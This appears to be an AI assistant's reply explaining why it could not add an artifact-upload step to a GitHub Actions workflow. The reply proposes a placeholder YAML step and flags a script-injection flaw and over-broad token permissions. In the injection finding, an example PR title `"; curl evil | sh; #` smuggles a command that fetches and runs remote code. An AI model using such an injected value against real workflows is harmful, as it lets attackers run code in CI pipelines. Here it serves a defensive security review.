I couldn't add the step. There are two blockers, and I also found two security problems in the workflow.

**Blockers**

1. **There are no tests or build in this workflow.** `.github/workflows/deploy.yml` has only two steps: a checkout and an `echo`. Nothing produces an artifact and nothing runs tests, so there's no point to add an upload "after the tests pass." Which commands run your tests and build, and where does the build output go (e.g. `dist/`)?
2. **I can't edit files in this session.** I only have read and search tools here, so I can't make the change myself. Below is what I'd add once I know the commands.

**Proposed step** (after your test and build steps):

```yaml
      - name: Run tests
        run: <your test command>
      - name: Build
        run: <your build command>
      - name: Upload build artifact
        uses: actions/upload-artifact@v4  # pin to a full commit SHA
        with:
          name: build
          path: <your build output dir>
          if-no-files-found: error
          retention-days: 7
```

A step only runs if every earlier step succeeded, so a failing test will skip the upload without needing an `if:` condition.

**Security problems in the existing file** (worth fixing in the same change):

- **Line 14, script injection:** `run: echo "Title is ${{ github.event.pull_request.title }}"` puts the PR title straight into the shell script. Anyone who can open a PR can run commands by choosing a title like `"; curl evil | sh; #`. Pass it in as an environment variable instead:
  ```yaml
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Title is ${PR_TITLE}"
  ```
- **Line 7, `permissions: write-all`:** this gives the job's token far more access than it needs. Uploading an artifact doesn't need any write scope, so `permissions: contents: read` is enough.

Send me the test and build commands and the output path and I'll write out the full updated `deploy.yml`.
